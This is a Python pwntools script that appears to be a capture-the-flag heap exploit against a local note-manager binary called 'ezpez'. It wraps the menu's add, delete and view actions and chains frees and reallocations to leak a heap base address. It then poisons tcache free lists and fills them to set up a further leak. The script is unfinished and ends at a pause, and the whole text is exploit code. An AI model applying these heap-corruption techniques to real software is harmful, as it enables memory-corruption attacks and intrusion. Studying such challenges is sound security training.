from pwn import *

io = process('./ezpez')
libc = ELF('./libc.so.6')

def add(TYPE, note_num):
    print(io.recvuntil(b'choice>> '))
    io.sendline(b'1')
    print(io.recvuntil(b'> '))
    io.sendline(str(TYPE))
    print(io.recvuntil(b'Your note number: '))
    io.sendline(str(note_num))

def delete(TYPE):
    print(io.recvuntil(b'choice>> '))
    io.sendline(b'2')
    print(io.recvuntil(b'> '))
    io.sendline(str(TYPE))

def view(TYPE):
    print(io.recvuntil(b'choice>> '))
    io.sendline(b'3')
    print(io.recvuntil(b'> '))
    io.sendline(str(TYPE))

add(1, 1)
delete(1)
add(2, 1)
delete(1)
view(1)
print(io.recvuntil(b'number :'))
heapbase = (int(io.recvline()) & 0xffffffff) - 0x260
add(2, 1)
delete(2)
add(1, heapbase+0x260+0x40)
delete(2)
add(1, heapbase+0x260)
add(1, 0xa0)
for i in range(7):
    add(1, 1)
    delete(2)

add(1, 1)
delete(2)
view(2)
pause()

print(io.recvall())
